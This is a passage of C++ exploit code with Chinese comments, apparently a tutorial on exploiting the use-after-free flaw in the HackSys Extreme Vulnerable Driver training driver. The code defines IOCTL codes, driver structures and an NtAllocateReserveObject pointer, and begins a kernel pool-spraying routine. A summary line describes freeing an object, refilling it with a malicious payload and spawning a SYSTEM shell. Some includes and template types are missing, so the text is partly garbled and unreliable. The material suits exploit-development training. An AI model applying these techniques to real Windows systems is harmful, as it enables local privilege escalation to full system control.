for (int i = 0; i 然后立即释放该对象->使用恶意载荷填充虚假对象->然后使用UAF对象->我们生成Windows系统shell
# include  // 包含标准输入输出流库
# include  // 包含 Windows API 库
# include  // 包含向量库
// 引入 HackSysExtremeVulnerableDriver.h 中的 IOCTL 宏定义
# define HACKSYS_EVD_IOCTL_ALLOCATE_UAF_OBJECT CTL_CODE(FILE_DEVICE_UNKNOWN,
0x804, METHOD_NEITHER, FILE_ANY_ACCESS)
# define HACKSYS_EVD_IOCTL_USE_UAF_OBJECT CTL_CODE(FILE_DEVICE_UNKNOWN, 0x805,
METHOD_NEITHER, FILE_ANY_ACCESS)
# define HACKSYS_EVD_IOCTL_FREE_UAF_OBJECT CTL_CODE(FILE_DEVICE_UNKNOWN,
0x806, METHOD_NEITHER, FILE_ANY_ACCESS)
# define HACKSYS_EVD_IOCTL_ALLOCATE_FAKE_OBJECT CTL_CODE(FILE_DEVICE_UNKNOWN,
0x807, METHOD_NEITHER, FILE_ANY_ACCESS)
// 声明了一个函数指针类型 FunctionPointer  
typedef void (*FunctionPointer)();
// 使用 UseAfterFree.h 中的 USE_AFTER_FREE 结构体类型  
typedef struct _USE_AFTER_FREE {  
FunctionPointer Callback;  
CHAR Buffer[0x54];  
} USE_AFTER_FREE, *PUSE_AFTER_FREE;
// 声明一个 UNICODE_STRING 类型结构体  
// 用于定义对象属性的 Unicode 字符串  
//   
typedef struct _LSA_UNICODE_STRING {  
USHORT Length;  
USHORT MaximumLength;  
PWSTR Buffer;  
} UNICODE_STRING;
// 定义用于 NtAllocateReserveObject 函数的对象属性  
//   
typedef struct _OBJECT_ATTRIBUTES {  
ULONG Length;  
HANDLE RootDirectory;  
UNICODE_STRING* ObjectName;  
ULONG Attributes;  
PVOID SecurityDescriptor;  
PVOID SecurityQualityOfService;  
} OBJECT_ATTRIBUTES;
# define POBJECT_ATTRIBUTES OBJECT_ATTRIBUTES*
// 声明一个指向 NtAllocateReserveObject 函数的函数指针  
//   
typedef NTSTATUS(WINAPI *_NtAllocateReserveObject)(  
OUT PHANDLE hObject,  
IN POBJECT_ATTRIBUTES ObjectAttributes,  
IN DWORD ObjectType);
// 定义一个名为 spray_pool 的函数，传入一个参数 objects_n  
std::pairstd::vector> spray_pool(int
objects_n){
    // 1/4 用于堆碎片整理，3/4 用于顺序堆分配
    int defrag_n = 0.25 * objects_n;